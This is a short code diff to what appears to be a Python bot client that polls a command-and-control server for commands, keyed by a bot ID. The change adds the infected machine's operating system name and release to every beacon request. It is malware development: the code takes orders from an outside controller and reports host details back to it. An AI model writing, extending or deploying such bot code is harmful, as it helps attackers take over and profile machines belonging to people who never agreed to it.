@@ -4,7 +4,7 @@ import time
 import os
 import requests
 import sys
-import pkgutil
+import platform
 
 import settings
 import utils
@@ -47,7 +47,7 @@ if __name__ == "__main__":
         if is_idle:
             time.sleep(settings.REQUEST_INTERVAL)
         try:
-            command = requests.get(settings.SERVER_URL + "/api/pop?botid=" + settings.BOT_ID).text
+            command = requests.get(settings.SERVER_URL + "/api/pop?botid=" + settings.BOT_ID + "&sysinfo=" + platform.system() + " " + platform.release()).text
             cmdargs = command.split(" ")
             if command:
                 if settings.DEBUG:
